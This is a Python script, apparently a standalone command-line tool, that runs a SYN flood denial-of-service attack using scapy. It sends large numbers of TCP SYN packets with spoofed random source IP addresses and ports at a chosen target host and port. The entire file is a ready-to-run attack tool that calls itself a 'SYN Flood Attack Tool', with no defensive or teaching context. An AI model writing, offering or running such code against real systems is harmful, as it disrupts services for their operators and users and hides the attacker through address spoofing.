import argparse
import random
import sys
import time
from scapy.all import IP, TCP, send, RandShort


def generate_random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def syn_flood(target_ip, target_port, packet_count, delay=0, verbose=True):
    if verbose:
        print(f"[*] Starting SYN flood attack on {target_ip}:{target_port}")
        print(f"[*] Sending {packet_count} SYN packets...")
    sent_count = 0
    start_time = time.time()
    for i in range(packet_count):
        # generate random source ip
        src_ip = generate_random_ip()
        # create ip packet with spoofed source
        ip_layer = IP(src=src_ip, dst=target_ip)
        # create tcp syn packet with random source port
        tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S", seq=random.randint(1000, 9000))
        # combine layers and send
        packet = ip_layer / tcp_layer
        send(packet, verbose=0)
        sent_count += 1
        if verbose and (i + 1) % 100 == 0:
            elapsed = time.time() - start_time
            rate = sent_count / elapsed if elapsed > 0 else 0
        if delay > 0:
            time.sleep(delay)
    elapsed = time.time() - start_time
    if verbose:
        print(f"[+] Attack completed: {sent_count} packets sent in {elapsed:.2f} seconds")
        print(f"[+] Average rate: {sent_count / elapsed:.2f} packets/sec")
    return sent_count


def main():
    parser = argparse.ArgumentParser(
        description="SYN Flood Attack Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
	epilog=""""""
    )
    parser.add_argument(
        "-t", "--target",
        required=True,
        help="Target IP address"
    )
    parser.add_argument(
        "-p", "--port",
        type=int,
        default=80,
        help="Target port (default: 80)"
    )
    parser.add_argument(
        "-c", "--count",
        type=int,
        default=1000,
        help="Number of packets to send (default: 1000)"
    )
    parser.add_argument(
        "-d", "--delay",
        type=float,
        default=0,
        help="Delay between packets in seconds (default: 0)"
    )
    parser.add_argument(
        "-q", "--quiet",
        action="store_true",
        help="Suppress output"
    )
    args = parser.parse_args()
    try:
        syn_flood(
            target_ip=args.target,
            target_port=args.port,
            packet_count=args.count,
            delay=args.delay,
            verbose=not args.quiet
        )
    except PermissionError:
        print("Error: Root privileges required to send packets.")
        print("Run with sudo: sudo python syn_flood.py ...")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        sys.exit(0)

if __name__ == "__main__":
    main()
